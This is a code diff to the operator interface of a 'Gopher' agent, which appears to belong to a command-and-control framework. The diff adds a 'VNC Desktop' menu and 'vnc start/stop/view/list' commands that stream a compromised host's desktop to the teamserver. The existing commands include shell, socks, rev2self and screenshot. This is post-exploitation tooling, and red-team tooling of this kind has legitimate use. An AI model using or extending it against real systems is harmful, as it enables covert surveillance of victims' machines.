@@ -1,5 +1,52 @@
 /// Gopher agent
 
+let vnc_start_action = menu.create_action("Start VNC Session", function(agents) {
+    agents.forEach(function(agent) {
+        let label_target_port = form.create_label("Target Port (on agent):");
+        let spin_target_port = form.create_spin();
+        spin_target_port.setRange(1024, 65535);
+        spin_target_port.setValue(40484);
+        let label_local_port = form.create_label("Local Port (on C2):");
+        let spin_local_port = form.create_spin();
+        spin_local_port.setRange(1024, 65535);
+        spin_local_port.setValue(41484);
+        let layout = form.create_gridlayout();
+        layout.addWidget(label_target_port, 0, 0, 1, 1);
+        layout.addWidget(spin_target_port, 0, 1, 1, 1);
+        layout.addWidget(label_local_port, 1, 0, 1, 1);
+        layout.addWidget(spin_local_port, 1, 1, 1, 1);
+        let dialog = form.create_dialog("Start VNC Session");
+        dialog.setSize(400, 120);
+        dialog.setLayout(layout);
+        if (dialog.exec() == true) {
+            ax.execute_command(agent, "vnc start " + spin_target_port.value() + " " + spin_local_port.value());
+        }
+    });
+});
+let vnc_view_action = menu.create_action("View Desktop", function(agents) { agents.forEach(v => ax.execute_command(v, "vnc view")) });
+let vnc_stop_action = menu.create_action("Stop VNC Session", function(agents) {
+    agents.forEach(function(agent) {
+        let port_label = form.create_label("Local Port:");
+        let port_spin = form.create_spin();
+        port_spin.setRange(1024, 65535);
+        port_spin.setValue(41484);
+        let layout = form.create_gridlayout();
+        layout.addWidget(port_label, 0, 0, 1, 1);
+        layout.addWidget(port_spin, 0, 1, 1, 1);
+        let dialog = form.create_dialog("Stop VNC Session");
+        dialog.setSize(300, 90);
+        dialog.setLayout(layout);
+        if (dialog.exec() == true) {
+            ax.execute_command(agent, "vnc stop " + port_spin.value());
+        }
+    });
+});
+let vnc_menu = menu.create_menu("VNC Desktop");
+vnc_menu.addItem(vnc_start_action);
+vnc_menu.addItem(vnc_view_action);
+vnc_menu.addItem(vnc_stop_action);
+menu.add_session_agent(vnc_menu, ["gopher"]);
+
 let exit_action = menu.create_action("Exit", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "exit")) });
 menu.add_session_agent(exit_action, ["gopher"])
 
@@ -182,8 +229,18 @@ function RegisterCommands(listenerType)
     cmd_zip_unix.addArgString("path", true);
     cmd_zip_unix.addArgString("zip_path", true);
 
-    let commands_win  = ax.create_commands_group("gopher", [cmd_cat_win,  cmd_cp, cmd_cd_win,  cmd_download_win,  cmd_execute, cmd_exit, cmd_job, cmd_kill, cmd_ls_win,  cmd_mv, cmd_mkdir_win,  cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm_win,  cmd_run_win,  cmd_screenshot, cmd_socks, cmd_shell_win,  cmd_upload_win,  cmd_zip_win] );
-    let commands_unix = ax.create_commands_group("gopher", [cmd_cat_unix, cmd_cp, cmd_cd_unix, cmd_download_unix,              cmd_exit, cmd_job, cmd_kill, cmd_ls_unix, cmd_mv, cmd_mkdir_unix, cmd_ps, cmd_pwd,               cmd_rm_unix, cmd_run_unix, cmd_screenshot, cmd_socks, cmd_shell_unix, cmd_upload_unix, cmd_zip_unix] );
+    let _cmd_vnc_start = ax.create_command("start", "Start a VNC desktop streaming session", "vnc start 40484 41484", "Task: start VNC session");
+    _cmd_vnc_start.addArgInt("target_port", true, "Listen port on agent");
+    _cmd_vnc_start.addArgInt("local_port", true, "Listen port on teamserver");
+    let _cmd_vnc_stop = ax.create_command("stop", "Stop a VNC desktop streaming session", "vnc stop 41484", "Task: stop VNC session");
+    _cmd_vnc_stop.addArgInt("local_port", true, "Listen port on teamserver");
+    let _cmd_vnc_view = ax.create_command("view", "Show the VNC viewer URL", "vnc view", "Task: show VNC viewer");
+    let _cmd_vnc_list = ax.create_command("list", "List active VNC sessions", "vnc list", "Task: list VNC sessions");
+    let cmd_vnc = ax.create_command("vnc", "VNC remote desktop sessions");
+    cmd_vnc.addSubCommands([_cmd_vnc_start, _cmd_vnc_stop, _cmd_vnc_view, _cmd_vnc_list]);
+
+    let commands_win  = ax.create_commands_group("gopher", [cmd_cat_win,  cmd_cp, cmd_cd_win,  cmd_download_win,  cmd_execute, cmd_exit, cmd_job, cmd_kill, cmd_ls_win,  cmd_mv, cmd_mkdir_win,  cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm_win,  cmd_run_win,  cmd_screenshot, cmd_socks, cmd_shell_win,  cmd_upload_win,  cmd_zip_win, cmd_vnc] );
+    let commands_unix = ax.create_commands_group("gopher", [cmd_cat_unix, cmd_cp, cmd_cd_unix, cmd_download_unix,              cmd_exit, cmd_job, cmd_kill, cmd_ls_unix, cmd_mv, cmd_mkdir_unix, cmd_ps, cmd_pwd,               cmd_rm_unix, cmd_run_unix, cmd_screenshot, cmd_socks, cmd_shell_unix, cmd_upload_unix, cmd_zip_unix, cmd_vnc] );
 
     return {
         commands_windows: commands_win,
